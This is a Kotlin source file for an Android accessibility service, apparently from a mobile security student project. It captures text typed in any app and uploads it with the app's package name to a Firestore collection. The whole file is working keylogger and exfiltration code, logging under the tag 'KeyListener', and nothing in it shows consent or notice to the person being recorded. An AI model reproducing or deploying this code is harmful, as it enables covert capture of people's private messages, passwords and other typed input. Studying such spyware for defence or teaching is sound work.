package mobilesecurity.sit.project.chats.conversation_backend

import android.accessibilityservice.AccessibilityService
import android.util.Log
import android.view.accessibility.AccessibilityEvent
import com.google.firebase.firestore.FirebaseFirestore

class ConversationClass : AccessibilityService() {
    private var foregroundApp = ""
    private var lastMsg = ""

    private fun sendTextToFirestore(appPackage: String, text: String) {
        val db = FirebaseFirestore.getInstance()

        val conversationData = ConversationData(appPackage, text)
        db.collection("conversationGroup")
            .add(conversationData)
            .addOnSuccessListener {
                Log.d("KeyListener", "Data added to Firestore")
            }
            .addOnFailureListener { e ->
                Log.e("KeyListener", "Error writing to Firestore", e)
            }
    }


    override fun onAccessibilityEvent(event: AccessibilityEvent?) {
        event?.let {
            when (it.eventType) {
                AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED -> {
                    val currApp = it.packageName.toString()
                    val text = it.text.joinToString(separator = ", ") { charSequence ->
                        charSequence.toString()
                    }
                    sendTextToFirestore(currApp, text)
                }
            }
        }
    }

    override fun onInterrupt() {
        // This method is called when the service is interrupted.
    }
}
